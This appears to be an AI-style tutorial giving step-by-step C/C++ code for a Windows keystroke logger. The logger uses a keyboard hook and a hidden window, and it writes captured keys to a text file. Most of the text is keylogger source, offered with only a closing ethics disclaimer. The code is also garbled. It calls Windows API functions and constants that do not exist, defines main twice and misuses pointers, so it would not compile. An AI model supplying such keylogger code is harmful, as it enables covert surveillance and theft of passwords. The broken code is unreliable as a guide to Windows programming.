To create a keystroke logger on a Windows computer, you can use the Windows API's keyboard hook. Here's a step-by-step guide to writing a simple keystroke logging application:

### Step 1: Include Necessary Headers

Include the necessary headers for window and user input functions:

```c
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <ctime>
#include <queue>
#include <iostream>
```

### Step 2: Define the Window Class

Define a window class to handle the hook callback:

```c
class KeyboardHook {
    public:
        static int installHook();
        static void uninstallHook(HANDLE hHook);
        static void processMessages();
        static LRESULT CALLBACK keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);
        static std::queue<KEYBDINPUT> keyQueue;
        static HANDLE g_hHook;
        static HWND g_hWnd;
        static bool isRecording;

    private:
        static void recordKeystroke(KEYBDINPUT *input);
        static void saveKeystroke(KEYBDINPUT *input);
        static void clearScreen();
};
```

### Step 3: Implement the Keyboard Hook

Implement the installation and uninstallation of the hook:

```c
int KeyboardHook::installHook() {
    g_hHook = SetWindowsHook(WHS_KEYBOARD, keyboardCallback);
    g_hWnd = CreateWindowEx(0, 0, 0, 0, 0, 0, WS_OVERLapped | WS_Hidden, 0, nullptr, nullptr, nullptr);
    if (!g_hWnd) {
        return -1;
    }
    EnableWindow(g_hWnd);
    return 0;
}

void KeyboardHook::uninstallHook(HANDLE hHook) {
    if (g_hHook == hHook) {
        g_hHook = nullptr;
        UnhookWindowsHook(g_hHook);
        DestroyWindow(g_hWnd);
    }
}

LRESULT CALLBACK KeyboardHook::keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (!g_hWnd) return 0;

    if (nCode == HCN_KEYDOWN || nCode == HCN_KEYUP) {
        KEYBDINPUT input;
        GetKeyState(0, &input);
        if (input.u.vKey != 0) {
            KEYBDINPUT key;
            key.u.vKey = input.u.vKey;
            key.u.flags = input.u.flags;
            key.u.wRepeat = 0;
            recordKeystroke(&key);
        }
    }
    return CallNextHook(nCode, wParam, lParam);
}

void KeyboardHook::recordKeystroke(KEYBDINPUT *input) {
    input.u.vKey = 0;
    input.u.flags = 0;
    input.u.wRepeat = 0;
    if (isRecording) {
        input.u.vKey = GetKeyState(0, &input);
        saveKeystroke(input);
    }
}
```

### Step 4: Main Function

Implement the main function to process messages and save keystrokes:

```c
int main() {
    bool running = true;
    KeyboardHook::installHook();
    while (running) {
        if (IsWindowMessagesPending(g_hWnd)) {
            MSG msg;
            GetMsg(&msg);
            if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                if (!KeyboardHook::isRecording) {
                    KeyboardHook::isRecording = true;
                }
            } else if (msg.message == WM_KEYUP) {
                if (KeyboardHook::isRecording) {
                    KeyboardHook::isRecording = false;
                }
            }
            TranslateMsg(&msg, 0);
            DispatchMessage(&msg);
        }
        Sleep(100); // Prevent high CPU usage
    }
    KeyboardHook::uninstallHook(g_hHook);
    return 0;
}
```

### Step 5: Save Keystrokes

Implement the save function to store keystrokes:

```c
void KeyboardHook::saveKeystroke(KEYBDINPUT *input) {
    time_t now;
    time(&now);
    FILE *file = fopen("keystrokes.txt", "a");
    if (file) {
        fprintf(file, "[%s] ", ctime(&now));
        for (int i = 0; i < 32; i++) {
            fprintf(file, "0x%02x ", input.u.keysSymmetric[i]);
        }
        fprintf(file, "\n");
        fclose(file);
    }
}
```

### Step 6: Usage

Use the hook in your main program:

```c
int main() {
    KeyboardHook hook;
    hook.installHook();
    while (true) {
        Sleep(100);
    }
}
```

### Important Notes

- **Ethical Use**: Always use this for legitimate purposes only. Unauthorized keystroke logging is illegal and unethical.
- **Performance**: The Sleep function is used to reduce CPU usage.
- **_privacy concerns**: Ensure users are informed and consent is obtained before deploying such software.

